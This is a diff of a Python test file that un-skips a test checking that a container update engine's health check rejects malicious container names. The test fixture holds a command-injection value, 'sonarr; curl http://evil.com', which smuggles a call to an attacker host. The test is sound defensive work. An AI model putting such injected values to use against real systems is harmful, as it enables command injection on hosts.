@@ -571,15 +571,11 @@ class TestHealthCheckValidation:
             assert result["success"] is False
             assert "exited" in result["error"]
 
-    @pytest.mark.skip(reason="Implementation needs refactoring - validate_service_name raises exception instead of returning False")
     @pytest.mark.asyncio
     async def test_health_check_validates_container_name(self, make_update):
         """Test health check validates container name to prevent injection.
 
-        NOTE: This test is currently skipped because the implementation at
-        update_engine.py:1066 uses `if not validate_service_name(target)` which
-        expects a boolean return, but validate_service_name() raises ValidationError
-        on invalid input. This needs to be refactored to use try/except.
+        Implementation correctly uses try/except to catch ValidationError from validate_service_name().
         """
         container = Container(
             name="sonarr; curl http://evil.com",  # Malicious name
